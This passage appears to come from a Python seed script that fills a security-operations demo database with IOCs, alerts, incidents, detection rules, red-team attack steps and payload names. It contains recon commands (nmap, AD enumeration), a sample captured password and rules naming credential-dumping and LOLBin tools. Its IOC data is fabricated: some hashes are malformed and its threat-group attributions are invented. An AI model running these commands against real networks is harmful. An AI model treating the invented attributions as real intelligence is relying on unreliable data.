        (IOCType.ip, "91.92.109.174", Severity.high, 80, "APT41 scanner", "Emerging Threats"),
        (IOCType.ip, "162.33.177.139", Severity.medium, 70, "Brute force source", "Internal"),
        (IOCType.ip, "185.234.218.74", Severity.high, 82, "ALPHV BlackCat C2", "MISP"),
        (IOCType.ip, "5.188.206.14", Severity.medium, 65, "Scanning activity", "AlienVault OTX"),
        (IOCType.ip, "23.108.57.83", Severity.high, 78, "Cobalt Strike beacon", "Cisco Talos"),
        (IOCType.domain, "update-service.xyz", Severity.critical, 95, "APT29 phishing domain", "AlienVault OTX"),
        (IOCType.domain, "secure-login.net", Severity.high, 85, "Credential harvesting site", "VirusTotal"),
        (IOCType.domain, "microsoft-update.co", Severity.critical, 92, "Typosquatting domain used by Lazarus", "Cisco Talos"),
        (IOCType.domain, "adobe-support.online", Severity.high, 80, "Phishing domain", "MISP"),
        (IOCType.domain, "cdn-delivery.top", Severity.medium, 70, "Malware distribution", "Abuse.ch"),
        (IOCType.domain, "analytics-service.io", Severity.high, 82, "REvil C2 domain", "Emerging Threats"),
        (IOCType.domain, "helpdesk-portal.org", Severity.medium, 68, "Scattered Spider phishing", "Internal"),
        (IOCType.hash_sha256, "a8e5b5e31e5a9e4f7d3c2b1a0e9f8d7c6b5a4e3d2c1b0a9f8e7d6c5b4a3e2d1", Severity.critical, 98, "NotPetya ransomware sample", "VirusTotal"),
        (IOCType.hash_sha256, "d4c3b2a1e0f9e8d7c6b5a4e3d2c1b0a9f8e7d6c5b4a3e2d1c0b9a8e7d6c5b4", Severity.critical, 95, "Ryuk ransomware dropper", "Cisco Talos"),
        (IOCType.hash_sha256, "e1f2d3c4b5a6e7f8d9c0b1a2e3f4d5c6b7a8e9f0d1c2b3a4e5f6d7c8b9a0", Severity.high, 90, "Mimikatz variant", "MISP"),
        (IOCType.hash_md5, "5d41402abc4b2a76b9719d911017c592", Severity.high, 88, "Cobalt Strike stager", "AlienVault OTX"),
        (IOCType.hash_sha256, "f0e1d2c3b4a5e6f7d8c9b0a1e2f3d4c5b6a7e8f9d0c1b2a3e4f5d6c7b8a9e0", Severity.medium, 75, "Info stealer dropper", "VirusTotal"),
        (IOCType.url, "hxxp://185.220.101.45/update.exe", Severity.critical, 95, "Malware download URL", "Abuse.ch"),
        (IOCType.url, "hxxps://update-service.xyz/payload/stage2.bin", Severity.critical, 93, "Second stage payload", "Cisco Talos"),
        (IOCType.url, "hxxp://cdn-delivery.top/docs/invoice.exe", Severity.high, 85, "Phishing attachment URL", "AlienVault OTX"),
        (IOCType.email, "noreply@microsoft-update.co", Severity.high, 90, "APT phishing sender", "Internal"),
        (IOCType.email, "security@adobe-support.online", Severity.high, 85, "Phishing email address", "MISP"),
        (IOCType.registry_key, r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Updater", Severity.high, 82, "Persistence registry key", "Internal"),
        (IOCType.ip, "10.0.0.200", Severity.critical, 99, "INTERNAL: Compromised host C2 beacon detected", "Internal"),
        (IOCType.ip, "172.16.10.50", Severity.high, 88, "INTERNAL: Lateral movement pivot host", "Internal"),
        (IOCType.domain, "pastebin.com/raw/abcd1234", Severity.medium, 60, "C2 configuration retrieval", "Internal"),
        (IOCType.hash_sha256, "b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1", Severity.medium, 72, "Credential stealer utility", "VirusTotal"),
        (IOCType.ip, "203.0.113.45", Severity.high, 80, "TOR exit node used for C2", "Emerging Threats"),
        (IOCType.ip, "198.51.100.89", Severity.medium, 65, "VPN service used for anonymization", "Cisco Talos"),
        (IOCType.domain, "cloudstorage-backup.net", Severity.high, 78, "Data exfiltration staging site", "MISP"),
        (IOCType.ip, "185.199.108.10", Severity.medium, 58, "Cryptocurrency mining pool", "Abuse.ch"),
        (IOCType.hash_sha1, "da39a3ee5e6b4b0d3255bfef95601890afd80709", Severity.low, 45, "Known benign tool flagged", "Internal"),
    ]
    iocs = []
    for itype, val, sev, conf, desc, src in ioc_data:
        ioc = IOC(type=itype, value=val, severity=sev, confidence=conf, description=desc, source=src,
                  first_seen=now - timedelta(days=random.randint(30, 365)),
                  last_seen=now - timedelta(days=random.randint(0, 30)),
                  expired=random.random() < 0.05, hit_count=random.randint(0, 50),
                  tags=[sev.value, src.lower().replace(" ", "-")])
        db.add(ioc); db.flush(); iocs.append(ioc)

    # link IOCs to actors
    for i, actor in enumerate(actors[:4]):
        ioc_slice = iocs[i*3:(i+1)*3]
        actor.ioc_ids = [ic.id for ic in ioc_slice]
    db.flush()

    # ── Campaigns ─────────────────────────────────────────────────────────────
    campaigns_data = [
        ("Operation Dark Nexus", 0, "active", "Multi-phase espionage campaign targeting financial sector using spear-phishing and LOTL techniques"),
        ("Blackcat Surge Q1", 6, "active", "ALPHV ransomware campaign targeting healthcare and manufacturing with double extortion"),
        ("CloudStorm", 1, "active", "APT41 cloud infrastructure attack targeting misconfigured S3 buckets and exposed APIs"),
        ("SWIFT Ghost", 2, "completed", "Lazarus Group financial theft campaign targeting SWIFT banking systems"),
        ("SolarFrost", 0, "monitoring", "APT29 supply chain compromise campaign similar to SolarWinds targeting IT vendors"),
        ("RansomWeb-2024", 3, "active", "REvil revival campaign targeting unpatched MOVEit and GoAnywhere MFT installations"),
    ]
    campaigns = []
    for name, actor_idx, status, desc in campaigns_data:
        c = Campaign(name=name, actor_id=actors[actor_idx].id, status=status, description=desc,
                     start_date=now - timedelta(days=random.randint(60, 180)),
                     targets=actors[actor_idx].target_sectors[:2],
                     ttps=actors[actor_idx].ttps[:4],
                     ioc_ids=actors[actor_idx].ioc_ids[:3])
        db.add(c); db.flush(); campaigns.append(c)

    # ── Threat Feeds ──────────────────────────────────────────────────────────
    feeds_data = [
        ("AlienVault OTX", "STIX", "https://otx.alienvault.com/api/v1/pulses/subscribed", "JSON", 14820, True),
        ("Cisco Talos Intelligence", "CSV", "https://www.talosintelligence.com/documents/ip-list", "CSV", 5321, True),
        ("Abuse.ch MalwareBazaar", "JSON", "https://mb-api.abuse.ch/api/v1/", "JSON", 98234, True),
        ("Emerging Threats", "STIX", "https://rules.emergingthreats.net/open/suricata-5.0/emerging.rules.tar.gz", "STIX", 3201, True),
        ("MISP Community", "MISP", "https://misp.corp.local/events/restSearch", "MISP", 7654, False),
        ("VirusTotal Intelligence", "JSON", "https://www.virustotal.com/api/v3/feeds/files", "JSON", 45100, True),
    ]
    for name, ftype, url, fmt, cnt, enabled in feeds_data:
        f = ThreatFeed(name=name, type=ftype, url=url, format=fmt, enabled=enabled,
                       ioc_count=cnt, last_fetched=now - timedelta(hours=random.randint(1, 48)),
                       auto_update=True, update_interval_hours=24)
        db.add(f)

    # ── Alerts ────────────────────────────────────────────────────────────────
    alerts_data = [
        ("Lateral Movement via SMB - Finance Subnet", AlertSeverity.critical, AlertStatus.investigating, "SIEM", [0,16], "Suspicious SMB lateral movement detected from WS-FIN-001 to DC-PROD-01. Possible credential relay attack.", ["T1021","T1550"]),
        ("Ransomware Behavior Detected - DB Server", AlertSeverity.critical, AlertStatus.investigating, "EDR", [6], "Mass file encryption activity detected on DB-PROD-01. Possible ransomware execution.", ["T1486","T1489"]),
        ("Brute Force Attack - VPN Gateway", AlertSeverity.high, AlertStatus.open, "IDS", [11], "1,247 failed authentication attempts against VPN gateway from 162.33.177.139 in 10 minutes.", ["T1110"]),
        ("DNS Tunneling Detected", AlertSeverity.high, AlertStatus.open, "NDR", [0], "Anomalous DNS query patterns consistent with DNS tunneling detected from DC-PROD-01.", ["T1071","T1572"]),
        ("Mimikatz Execution Detected", AlertSeverity.critical, AlertStatus.open, "EDR", [16], "LSASS memory dump attempt detected consistent with Mimikatz credential dumping.", ["T1003","T1558"]),
        ("Privilege Escalation - Finance User", AlertSeverity.high, AlertStatus.investigating, "SIEM", [16], "User john.finley escalated privileges using token manipulation technique.", ["T1134","T1078"]),
        ("Unusual Process Execution - Web Server", AlertSeverity.high, AlertStatus.open, "EDR", [3], "cmd.exe spawned by apache2 process - possible web shell execution.", ["T1059","T1505"]),
        ("Data Exfiltration Attempt - Cloud Storage", AlertSeverity.critical, AlertStatus.open, "NDR", [6,23], "Large data transfer to cloudstorage-backup.net detected (14.3 GB in 2 hours).", ["T1041","T1567"]),
        ("Known IOC Match - C2 Communication", AlertSeverity.critical, AlertStatus.open, "SIEM", [27], "Outbound connection to known C2 IP 185.220.101.45 from AWS-EC2-WEB-01.", ["T1071","T1095"]),
        ("PowerShell Encoded Command Execution", AlertSeverity.high, AlertStatus.open, "EDR", [0], "PowerShell with base64-encoded payload executed on DC-PROD-01.", ["T1059","T1027"]),
        ("Pass-the-Hash Attack Detected", AlertSeverity.critical, AlertStatus.open, "SIEM", [0,1], "NTLM authentication with reused hash from WS-EXEC-001 to multiple targets.", ["T1550","T1021"]),
        ("Suspicious Scheduled Task Creation", AlertSeverity.medium, AlertStatus.open, "EDR", [16], "New scheduled task created pointing to temp directory executable.", ["T1053","T1547"]),
        ("SQL Injection Attempt - Web Application", AlertSeverity.high, AlertStatus.open, "WAF", [3], "Multiple SQL injection attempts detected in POST parameters.", ["T1190"]),
        ("Account Creation - Domain Controller", AlertSeverity.high, AlertStatus.investigating, "SIEM", [0], "New privileged account corp\\svc_backup2 created outside change window.", ["T1136","T1098"]),
        ("Kerberoasting Attack Detected", AlertSeverity.high, AlertStatus.open, "SIEM", [0,1], "Multiple Kerberos service ticket requests for service accounts detected.", ["T1558"]),
        ("Registry Persistence Mechanism", AlertSeverity.medium, AlertStatus.open, "EDR", [16], "Autorun registry key modification detected in HKLM\\Run.", ["T1547","T1112"]),
        ("Phishing Email Delivered - HR Department", AlertSeverity.medium, AlertStatus.resolved, "Email", [18], "Phishing email with malicious attachment delivered to 3 HR staff.", ["T1566"]),
        ("Anomalous Login - Exec Account", AlertSeverity.high, AlertStatus.resolved, "SIEM", [20], "CEO account login from Moscow, Russia at 3:14 AM local time.", ["T1078"]),
        ("Container Escape Attempt", AlertSeverity.critical, AlertStatus.open, "Falco", [28], "Container breakout attempt detected using privileged pod escalation.", ["T1611","T1068"]),
        ("Cloud Metadata SSRF Attempt", AlertSeverity.high, AlertStatus.open, "WAF", [24], "IMDSv1 metadata service queried via SSRF from web application.", ["T1552","T1078"]),
        ("WMI Persistence Detected", AlertSeverity.medium, AlertStatus.open, "EDR", [16], "WMI event subscription created for persistence on finance workstation.", ["T1546"]),
        ("Network Scan from Internal Host", AlertSeverity.medium, AlertStatus.open, "NDR", [16], "Rapid port scan of entire 10.0.0.0/8 range from WS-FIN-002.", ["T1046","T1082"]),
        ("SSL Certificate Pinning Bypass", AlertSeverity.low, AlertStatus.resolved, "NDR", [], "TLS interception tool detected on developer workstation.", ["T1040"]),
        ("File Encryption Activity - Endpoint", AlertSeverity.critical, AlertStatus.open, "EDR", [16], "Bulk file extension changes detected consistent with ransomware pre-encryption.", ["T1486"]),
        ("Cobalt Strike Beacon Detected", AlertSeverity.critical, AlertStatus.investigating, "EDR", [3], "Cobalt Strike C2 communication pattern detected in process memory.", ["T1071","T1090"]),
    ]
    alert_list = []
    for i, (title, sev, status, src, asset_idxs, desc, techs) in enumerate(alerts_data):
        a = Alert(title=title, description=desc, severity=sev, status=status, source=src,
                  asset_ids=[assets[idx].id for idx in asset_idxs if idx < len(assets)],
                  mitre_techniques=techs, tags=[sev.value, src.lower()],
                  created_at=now - timedelta(hours=random.randint(1, 72)),
                  acknowledged_at=now - timedelta(hours=random.randint(1, 24)) if status in [AlertStatus.investigating, AlertStatus.resolved] else None,
                  resolved_at=now - timedelta(hours=random.randint(1, 12)) if status == AlertStatus.resolved else None)
        db.add(a); db.flush(); alert_list.append(a)

    # ── Incidents ─────────────────────────────────────────────────────────────
    incidents_data = [
        ("INC-2024-001: Ransomware Detection - Finance Department", IncidentSeverity.critical, IncidentStatus.investigating,
         "Active ransomware attack targeting finance department workstations. File encryption detected on 3 hosts.",
         [0,16,17], [0,1,4], "TLP:RED", 0, 3, ["T1486","T1489","T1027"], ["TA0040","TA0005"]),
        ("INC-2024-002: APT Lateral Movement Campaign", IncidentSeverity.high, IncidentStatus.triaged,
         "Advanced persistent threat performing lateral movement through the network using valid credentials.",
         [0,1,16], [0,5,10], "TLP:AMBER", 15, 2, ["T1021","T1550","T1078"], ["TA0008","TA0006"]),
        ("INC-2024-003: Data Exfiltration - Customer Database", IncidentSeverity.critical, IncidentStatus.contained,
         "Suspected data exfiltration of customer PII from database server via compromised API service.",
         [6,3], [7,3], "TLP:RED", 10000, 2, ["T1041","T1567","T1005"], ["TA0010","TA0009"]),
        ("INC-2024-004: Phishing Campaign - Finance & HR Targeting", IncidentSeverity.medium, IncidentStatus.closed,
         "Coordinated spear-phishing campaign targeting Finance and HR staff with credential harvesting pages.",
         [16,17,18], [15,16], "TLP:AMBER", 8, 0, ["T1566","T1078"], ["TA0001","TA0006"]),
        ("INC-2024-005: Supply Chain Compromise - NPM Package", IncidentSeverity.high, IncidentStatus.investigating,
         "Malicious NPM package found in development pipeline. Possible supply chain attack affecting internal tooling.",
         [21,28], [24], "TLP:AMBER", 0, 5, ["T1195","T1059"], ["TA0001","TA0002"]),
        ("INC-2024-006: Credential Stuffing - Customer Portal", IncidentSeverity.medium, IncidentStatus.eradicated,
         "Mass credential stuffing attack against customer-facing portal. 2,341 accounts attempted, 47 successfully accessed.",
         [3,4], [11], "TLP:GREEN", 47, 1, ["T1110","T1078"], ["TA0006","TA0001"]),
        ("INC-2024-007: Cloud Infrastructure Breach - AWS", IncidentSeverity.high, IncidentStatus.investigating,
         "Unauthorized access to AWS environment via exposed IAM key. S3 bucket data accessed.",
         [24,25,26], [19,8], "TLP:AMBER", 0, 3, ["T1078","T1552","T1530"], ["TA0001","TA0009"]),
        ("INC-2024-008: Insider Threat - Data Staging", IncidentSeverity.high, IncidentStatus.triaged,
         "Departing employee found staging large amounts of proprietary data to personal cloud storage.",
         [21], [6], "TLP:AMBER", 1, 1, ["T1052","T1567","T1213"], ["TA0009","TA0010"]),
    ]
    incident_list = []
    for i, (title, sev, status, desc, asset_idxs, alert_idxs, tlp, aff_users, aff_sys, techs, tacs) in enumerate(incidents_data):
        inc = Incident(title=title, description=desc, severity=sev, status=status,
                       assignee_id=users[random.randint(1,3)].id,
                       asset_ids=[assets[idx].id for idx in asset_idxs if idx < len(assets)],
                       alert_ids=[alert_list[idx].id for idx in alert_idxs if idx < len(alert_list)],
                       tlp=tlp, affected_users=aff_users, affected_systems=aff_sys,
                       mitre_techniques=techs, mitre_tactics=tacs,
                       created_at=now - timedelta(days=random.randint(1, 30)),
                       resolved_at=now - timedelta(days=1) if status in [IncidentStatus.closed, IncidentStatus.eradicated] else None)
        db.add(inc); db.flush()
        # Timeline events
        for j, (action, detail) in enumerate([
            ("created", "Incident created from alert correlation."),
            ("assigned", f"Incident assigned to {users[1].full_name}."),
            ("status_changed", f"Status updated to {status.value}."),
            ("note", "Initial triage completed. Containment steps initiated."),
        ]):
            ev = IncidentEvent(incident_id=inc.id, user_id=users[min(j,3)].id, action=action,
                               details=detail, event_type=action,
                               timestamp=now - timedelta(hours=random.randint(1, 48)))
            db.add(ev)
        # Tasks
        for task_title in ["Isolate affected systems", "Collect forensic evidence", "Notify stakeholders"]:
            t = IncidentTask(incident_id=inc.id, assignee_id=users[random.randint(1,3)].id,
                             title=task_title, description=f"{task_title} for {title}",
                             status=random.choice(["open","in_progress","completed"]),
                             priority="high")
            db.add(t)
        incident_list.append(inc)
    db.flush()

    # Link alerts to incidents
    for i, inc in enumerate(incident_list[:4]):
        for alert in alert_list[i*3:(i+1)*3]:
            alert.incident_id = inc.id
    db.flush()

    # ── Cases ─────────────────────────────────────────────────────────────────
    for i, inc in enumerate(incident_list[:5]):
        case = Case(incident_id=inc.id, title=f"Case: {inc.title[:50]}",
                    description=f"Forensic case opened for {inc.title}",
                    status=random.choice(["open","in_progress","closed"]),
                    priority=inc.severity.value, assignee_id=users[random.randint(1,3)].id,
                    tlp=inc.tlp)
        db.add(case); db.flush()
        for note_text in ["Initial assessment complete.", "Evidence collection in progress.", "Awaiting threat intel correlation."]:
            db.add(CaseNote(case_id=case.id, user_id=users[1].id, content=note_text))
        for ev_name, ev_type in [("Memory Dump DC-PROD-01", "file"), ("Network PCAP", "network"), ("Screenshot", "screenshot")]:
            db.add(CaseEvidence(case_id=case.id, user_id=users[1].id, type=ev_type, name=ev_name,
                                description=f"Collected {ev_type} evidence", file_hash="sha256:" + "a"*64))
    db.flush()

    # ── Log Sources ───────────────────────────────────────────────────────────
    log_sources = []
    for name, ltype in [("Windows Event Log", "agent"), ("Linux Syslog", "syslog"), ("Firewall Logs", "api"),
                         ("DNS Logs", "api"), ("Web Proxy Logs", "file"), ("EDR Agent", "agent"),
                         ("AWS CloudTrail", "api"), ("VPN Logs", "syslog")]:
        ls = LogSource(name=name, type=ltype, enabled=True,
                       last_seen=now - timedelta(minutes=random.randint(1, 30)),
                       events_per_day=random.randint(1000, 50000))
        db.add(ls); db.flush(); log_sources.append(ls)

    # ── Log Events ────────────────────────────────────────────────────────────
    log_categories = ["authentication", "network", "process", "file", "dns", "registry", "other"]
    log_messages = [
        ("info", "authentication", "Successful logon for user corp\\john.smith from 10.1.1.101"),
        ("warning", "authentication", "Failed logon attempt for corp\\administrator from 162.33.177.139"),
        ("error", "authentication", "Account lockout triggered for corp\\sarah.chen after 5 failed attempts"),
        ("critical", "process", "Suspicious process lsass.exe accessed by unknown parent process procdump64.exe"),
        ("warning", "network", "Outbound connection to known malicious IP 185.220.101.45:443"),
        ("info", "network", "New TCP connection established from 10.0.2.10:54321 to 8.8.8.8:53"),
        ("warning", "dns", "Abnormally long DNS query: a1b2c3d4.update-service.xyz TXT record"),
        ("critical", "file", "Mass file modification detected in C:\\Users\\Public - 847 files in 60 seconds"),
        ("info", "authentication", "VPN session established for user devika.ops from 203.0.113.100"),
        ("warning", "process", "PowerShell execution with encoded command on DC-PROD-01"),
        ("error", "network", "Firewall blocked connection from 45.142.212.100 to DB-PROD-01:3306"),
        ("info", "registry", "Registry key modified: HKLM\\System\\CurrentControlSet\\Services"),
        ("critical", "authentication", "Kerberos golden ticket detected - anomalous TGT lifetime"),
        ("warning", "process", "cmd.exe spawned by apache2 - possible web shell"),
        ("info", "file", "Large file transfer initiated: 14.3GB to external host cloudstorage-backup.net"),
    ]
    for _ in range(80):
        level, cat, msg = random.choice(log_messages)
        le = LogEvent(source_id=random.choice(log_sources).id if log_sources else None,
                      level=level, category=cat, message=msg + f" [event_{random.randint(1000,9999)}]",
                      raw=f'<Event><System><EventID>{random.randint(4000,5000)}</EventID></System><EventData>{msg}</EventData></Event>',
                      source_ip=f"10.{random.randint(0,1)}.{random.randint(1,4)}.{random.randint(1,250)}",
                      dest_ip=f"10.0.{random.randint(1,4)}.{random.randint(1,50)}",
                      username=random.choice(["john.smith","sarah.chen","admin","svc_backup","unknown"]),
                      timestamp=now - timedelta(minutes=random.randint(1, 1440)))
        db.add(le)
    db.flush()

    # ── Detection Rules ───────────────────────────────────────────────────────
    rules_data = [
        ("Brute Force Login Attempt", "Detects multiple failed login attempts", "failed_logon_count > 5 WITHIN 5m", AlertSeverity.high, ["T1110"]),
        ("Lateral Movement via SMB", "Detects SMB-based lateral movement", "event_id:4648 AND network.direction:lateral AND protocol:smb", AlertSeverity.critical, ["T1021","T1550"]),
        ("Mimikatz Execution", "Detects Mimikatz credential dumping tool", "process.name:lsass.exe AND parent.name NOT IN (wininit.exe, services.exe)", AlertSeverity.critical, ["T1003","T1558"]),
        ("PowerShell Encoded Command", "Detects obfuscated PowerShell execution", "process.name:powershell.exe AND process.args:*-enc* OR *-EncodedCommand*", AlertSeverity.high, ["T1059","T1027"]),
        ("Suspicious Child Process", "Detects web server spawning shell", "parent.name IN (apache2,nginx,iis) AND child.name IN (cmd.exe,bash,sh,powershell.exe)", AlertSeverity.critical, ["T1059","T1505"]),
        ("DNS Tunneling", "Detects DNS queries with abnormally long labels", "dns.query.length > 50 AND dns.query.type:TXT", AlertSeverity.high, ["T1071","T1572"]),
        ("Ransomware File Extension Change", "Detects mass file extension modification", "file.extension.change.count > 100 WITHIN 1m", AlertSeverity.critical, ["T1486"]),
        ("New Admin Account Created", "Detects new privileged account creation", "event_id:4720 AND user.group:Domain Admins", AlertSeverity.high, ["T1136","T1098"]),
        ("Kerberoasting Detection", "Detects Kerberos service ticket enumeration", "event_id:4769 AND ticket.encryption:0x17 AND count > 5 WITHIN 10m", AlertSeverity.critical, ["T1558"]),
        ("Data Exfiltration via HTTP POST", "Detects large POST uploads to external hosts", "http.method:POST AND http.response_body > 10MB AND destination.type:external", AlertSeverity.high, ["T1041","T1567"]),
        ("WMI Persistence", "Detects WMI event subscription persistence", "event_id:5861 OR (process.name:wmic.exe AND process.args:*subscription*)", AlertSeverity.medium, ["T1546"]),
        ("Registry Run Key Modification", "Detects autorun registry key changes", "registry.path:*CurrentVersion\\Run* AND event_id:13", AlertSeverity.medium, ["T1547","T1112"]),
        ("Scheduled Task Creation", "Detects new scheduled task creation", "event_id:4698 AND task.path NOT LIKE *Microsoft*", AlertSeverity.medium, ["T1053"]),
        ("LOLBin Execution", "Detects living-off-the-land binary execution", "process.name IN (certutil.exe,mshta.exe,wscript.exe,cscript.exe,regsvr32.exe) AND network.connection:true", AlertSeverity.high, ["T1218","T1027"]),
        ("Pass-the-Hash Detection", "Detects NTLM pass-the-hash authentication", "event_id:4624 AND logon.type:3 AND auth.package:NTLM AND logon.process:NtLmSsp", AlertSeverity.critical, ["T1550"]),
        ("Suspicious Docker/Container Activity", "Detects container escape attempts", "container.privileged:true AND process.name IN (nsenter,chroot) AND user:root", AlertSeverity.critical, ["T1611"]),
        ("Cloud Metadata SSRF", "Detects IMDS access via web requests", "http.uri:*169.254.169.254* OR http.uri:*metadata.google.internal*", AlertSeverity.high, ["T1552"]),
        ("Cobalt Strike Beacon", "Detects Cobalt Strike C2 patterns", "network.bytes_sent:4096 AND network.interval.variance < 5 AND http.uri:*/submit.php*", AlertSeverity.critical, ["T1071","T1090"]),
        ("Account Enumeration", "Detects LDAP enumeration of AD accounts", "event_id:4661 AND object.type:*user* AND count > 50 WITHIN 5m", AlertSeverity.medium, ["T1087"]),
        ("Unusual Logon Hours", "Detects authentication outside business hours", "event_id:4624 AND logon.hour NOT IN (8,9,10,11,12,13,14,15,16,17)", AlertSeverity.medium, ["T1078"]),
    ]
    for name, desc, logic, sev, techs in rules_data:
        r = DetectionRule(name=name, description=desc, logic=logic, severity=sev,
                          enabled=True, mitre_techniques=techs,
                          match_count=random.randint(0, 500),
                          false_positive_rate=round(random.uniform(0, 0.15), 3))
        db.add(r)
    db.flush()

    # ── Attack Plans ──────────────────────────────────────────────────────────
    plans_data = [
        ("Q1 2024 Red Team Assessment", "Full-scope internal red team engagement", "Achieve Domain Admin on production DC within 5 days", ["TA0001","TA0003","TA0006","TA0008"], "approved", "Marcus Rodriguez, Alice Wong"),
        ("APT Simulation - Finance Targeting", "Simulate APT29 TTPs targeting finance department", "Simulate APT29 exfiltrating financial data undetected", ["TA0043","TA0001","TA0009","TA0010"], "completed", "Red Team Alpha"),
        ("Social Engineering Campaign", "Vishing and phishing simulation", "Obtain credentials via social engineering from 10% of target users", ["TA0043","TA0001"], "active", "Marcus Rodriguez"),
        ("Cloud Infrastructure Breach Simulation", "Simulate cloud-native attack on AWS environment", "Gain access to production database via cloud attack path", ["TA0001","TA0006","TA0009","TA0010"], "draft", "Red Team Beta"),
        ("Ransomware Simulation - Assumed Breach", "Simulate ransomware deployment from assumed breach position", "Demonstrate ransomware kill chain from initial foothold to encryption", ["TA0003","TA0004","TA0005","TA0040"], "approved", "Red Team Alpha"),
    ]
    plan_list = []
    for name, desc, obj, tacs, status, team in plans_data:
        p = AttackPlan(name=name, description=desc, objective=obj,
                       mitre_tactics=tacs, status=status, team=team,
                       authorization_level="assumed_breach",
                       rules_of_engagement="No destruction of production data. Notify blue team lead if critical system compromised.",
                       created_by_id=users[2].id)
        db.add(p); db.flush(); plan_list.append(p)

    # ── Attack Executions & Steps ─────────────────────────────────────────────
    exec1 = AttackExecution(plan_id=plan_list[0].id, name="Week 1 - Recon & Initial Access",
                             status="completed", operator="Marcus Rodriguez",
                             detection_rate=0.35,
                             started_at=now - timedelta(days=14), completed_at=now - timedelta(days=10))
    db.add(exec1); db.flush()
    steps_data = [
        ("T1595", 1, "Active Scanning - Port Discovery", "Perform port scan on perimeter hosts", "nmap -sV -p- -T4 10.0.0.0/24", "completed", "Discovered 127 hosts, 847 open ports. Key services: RDP (445), SMB (445), HTTP/S (80/443).", True),
        ("T1592", 2, "Host Information Gathering", "Enumerate host details via banner grabbing", "nmap -sV --script=banner 10.0.2.0/24", "completed", "Identified web stack: Nginx 1.18, Apache 2.4.48, IIS 10.0", False),
        ("T1566", 3, "Spear Phishing - IT Admin", "Send credential harvesting phish to IT admin", "GoPhish campaign targeting it-admin@corp.local", "completed", "1/1 credentials captured: john.smith@corp.local / P@ssw0rd123", True),
        ("T1078", 4, "Initial Access via Stolen Credentials", "Use captured credentials for VPN access", "openconnect vpn.corp.local -u john.smith", "completed", "Successfully authenticated to VPN and internal network.", False),
        ("T1082", 5, "Internal Reconnaissance", "Enumerate internal network and AD structure", "net user /domain; Get-ADComputer -Filter * | Select Name", "completed", "Enumerated 312 AD users, 89 computers, 24 service accounts.", True),
    ]
    for tech, order, name, desc, cmd, status, output, detected in steps_data:
        s = AttackStep(execution_id=exec1.id, technique_id=tech, step_order=order,
                       name=name, description=desc, command=cmd, status=status, output=output,
                       detection_triggered=detected,
                       started_at=now - timedelta(days=14) + timedelta(hours=order*4),
                       completed_at=now - timedelta(days=14) + timedelta(hours=order*4+2))
        db.add(s)
    db.flush()

    exec2 = AttackExecution(plan_id=plan_list[1].id, name="APT29 Finance Simulation",
                             status="completed", operator="Red Team Alpha",
                             detection_rate=0.28,
                             started_at=now - timedelta(days=30), completed_at=now - timedelta(days=20))
    db.add(exec2); db.flush()

    # ── Recon Records ─────────────────────────────────────────────────────────
    for target, rtype, source in [
        ("corp.local", "dns", "nmap"), ("10.0.2.10", "port_scan", "nmap"),
        ("john.smith@corp.local", "osint", "LinkedIn"), ("web-prod-01.corp.local", "service_enum", "nikto"),
        ("admin@corp.local", "osint", "OSINT Framework"), ("10.0.0.0/24", "port_scan", "masscan"),
    ]:
        db.add(ReconRecord(target=target, type=rtype, source=source, plan_id=plan_list[0].id,
                           data={"result": f"Recon data for {target}", "count": random.randint(10, 500)}))
    db.flush()

    # ── Payloads ──────────────────────────────────────────────────────────────
    for name, ptype, plat, techs in [
        ("Cobalt Strike Beacon HTTPS", "c2", "windows", ["T1071","T1090"]),
        ("PowerShell Reverse Shell", "dropper", "windows", ["T1059"]),
        ("Meterpreter x64 Staged", "exploit", "windows", ["T1059","T1055"]),
        ("Linux ELF Reverse Shell", "dropper", "linux", ["T1059"]),
        ("Office Macro Dropper", "dropper", "windows", ["T1204","T1566"]),
        ("Sliver C2 Implant", "c2", "all", ["T1071","T1572"]),
        ("Python SOCKS Proxy", "lateral_movement", "all", ["T1090","T1021"]),
        ("DLL Side-Loading Payload", "persistence", "windows", ["T1574"]),
        ("LSASS Credential Dumper", "exploit", "windows", ["T1003"]),
        ("Data Exfil via HTTPS POST", "exfiltration", "all", ["T1041","T1567"]),
    ]:
        db.add(Payload(name=name, type=ptype, platform=plat, description=f"Red team payload: {name}",
                       mitre_techniques=techs, is_active=True, created_by_id=users[2].id))
    db.flush()

    # ── Hunting Queries ───────────────────────────────────────────────────────
    hunting_queries = [
        ("Hunt: Kerberoasting", "Search for Kerberos service ticket anomalies", "SELECT * FROM events WHERE event_id=4769 AND ticket_encryption_type=0x17 GROUP BY service_name HAVING count > 3", "logs", ["T1558"]),
        ("Hunt: LOLBin Network Activity", "Find LOLB binaries making network connections", "SELECT * FROM processes WHERE name IN ('certutil','mshta','regsvr32') AND has_network_connection=true", "EDR", ["T1218","T1027"]),
        ("Hunt: Unusual PowerShell Activity", "Detect encoded/obfuscated PowerShell", "SELECT * FROM processes WHERE name='powershell.exe' AND (args LIKE '%-enc%' OR args LIKE '%-hidden%')", "EDR", ["T1059","T1027"]),
        ("Hunt: Credential Dumping", "Detect LSASS access patterns", "SELECT * FROM processes WHERE target_process='lsass.exe' AND source_process NOT IN ('svchost.exe','werfault.exe')", "EDR", ["T1003"]),
        ("Hunt: DNS Covert Channel", "Identify DNS-based C2 or tunneling", "SELECT * FROM dns_queries WHERE length(query) > 60 OR query_count_per_domain > 100 GROUP BY query", "network", ["T1071","T1572"]),
        ("Hunt: Scheduled Task Persistence", "Find non-Microsoft scheduled tasks", "SELECT * FROM scheduled_tasks WHERE author NOT LIKE '%Microsoft%' AND created_within_days=7", "logs", ["T1053"]),
        ("Hunt: Lateral Movement via WMI", "Detect WMI remote execution", "SELECT * FROM processes WHERE parent_name='WmiPrvSE.exe' AND child_name IN ('cmd.exe','powershell.exe','cscript.exe')", "EDR", ["T1047","T1021"]),
        ("Hunt: Data Staging Activity", "Identify large archive creation", "SELECT * FROM file_events WHERE extension IN ('zip','rar','7z') AND size > 100MB AND path NOT LIKE '%AppData%'", "EDR", ["T1560","T1005"]),
        ("Hunt: Pass-the-Hash", "Detect NTLM authentication anomalies", "SELECT * FROM auth_events WHERE auth_package='NTLM' AND logon_type=3 AND source_workstation != dest_workstation GROUP BY src HAVING count > 5", "logs", ["T1550"]),
        ("Hunt: Suspicious Registry Modifications", "Hunt for persistence via registry", "SELECT * FROM registry_events WHERE path LIKE '%Run%' OR path LIKE '%RunOnce%' AND modified_by NOT IN ('SYSTEM','TrustedInstaller')", "EDR", ["T1547","T1112"]),
